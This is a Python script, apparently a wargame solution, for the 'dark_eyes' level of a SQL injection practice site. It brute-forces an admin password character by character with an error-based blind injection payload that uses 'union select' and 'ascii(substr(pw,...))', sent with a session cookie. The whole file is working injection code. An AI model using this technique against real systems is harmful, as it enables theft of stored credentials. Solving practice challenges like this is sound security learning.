# made by TOR
# pw.py version 2.7

import urllib.request
from urllib.parse import quote

all_location = [] # 전체 패스워드 글자와 위치를 저장할 리스트 선언
password = [] # 패스워드를 저장할 리스트 선언

# 패스워드의 길이가 8이므로 크게 이중 for문을 
# 48 ~ 127 까지 아스키 코드 값을 반복함
for j in range(1, 9, 1):
            for i in range(48,129,1):
                        
                        # 사용할 쿼리 제작 
                        url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="
                        query = "'<>id='admin' and (select 1 union select ascii(substr(pw,"+str(j)+",1))="+str(i)+")-- -"
                        query = quote(query)
                        new_url = url + query
                        
                        # 쿠키 값 추가 해줌
                        req = urllib.request.Request(new_url)
                        req.add_header("Cookie", "<자신의 쿠키값>")
                        response = urllib.request.urlopen(req)
                        
                        # 서버가 응답한 데이터를 받아들임, 그 후 조건 실행
                        # query가 포함된 경우 참인 조건 
                        # <참고> 포함 : != -1 / 포함X : == -1 
                        # 위치와 글자를 찾아 리스트에 저장후 정지
                        if str(response.read()).find("query") != -1:
                                    location = [] # 각 글자의 패스워드 글자와 위치를 저장할 리스트 선언
                                    print("Found length!! =>"+str(chr(i)))
                                    location.append(str(chr(i)))
                                    location.append(j)   
                                    all_location.append(location)
                                    password.append(str(chr(i)))            
                                    break
                                                            
                        else:
                                    print("{}".format(i))
      
print("Finish")
print(all_location)
print("password:", password)
